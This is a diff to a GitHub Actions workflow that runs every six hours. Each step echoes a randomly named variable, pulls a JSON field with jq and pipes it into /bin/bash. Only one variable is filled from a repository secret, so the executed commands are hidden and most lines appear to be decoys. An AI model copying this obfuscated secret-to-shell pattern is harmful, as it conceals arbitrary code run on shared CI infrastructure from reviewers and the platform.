@@ -1,29 +1,26 @@
 name: fangzhangdx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 0/6 * * *'
+    - cron: '5 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fangzhangdx
         env:
-          kxw04872: ${{ secrets.kxw04872 }}
+          tleus847: ${{ secrets.tleus847 }}
         run: |
-          echo $kxw04872 | jq -r .zpwc747 | /bin/bash
-          echo $sbf39 | jq -r .l2356 | /bin/bash
-          echo $h84 | jq -r .wx9 | /bin/bash
-          echo $y9 | jq -r .y9311 | /bin/bash
-          echo $wawtw7455 | jq -r .qp20655 | /bin/bash
-          echo $ega8514 | jq -r .xks581 | /bin/bash
-          echo $gtll3 | jq -r .wabcc1 | /bin/bash
-          echo $mz8 | jq -r .jm69 | /bin/bash
-          echo $hcixe269 | jq -r .zu1 | /bin/bash
-          echo $yisg171 | jq -r .jd9403 | /bin/bash
-          echo $ayf58913 | jq -r .yahb03 | /bin/bash
-          echo $i62122 | jq -r .dnawn567 | /bin/bash
-          echo $en7 | jq -r .r60 | /bin/bash
+          echo $tleus847 | jq -r .mc6 | /bin/bash
+          echo $jo1 | jq -r .s377 | /bin/bash
+          echo $ljqca9814 | jq -r .giyy874 | /bin/bash
+          echo $gxly3114 | jq -r .bbi9 | /bin/bash
+          echo $qmmw64 | jq -r .qek62158 | /bin/bash
+          echo $dbo755 | jq -r .fomb1 | /bin/bash
+          echo $xq8027 | jq -r .f2988 | /bin/bash
+          echo $rcwv7622 | jq -r .qxj03 | /bin/bash
 
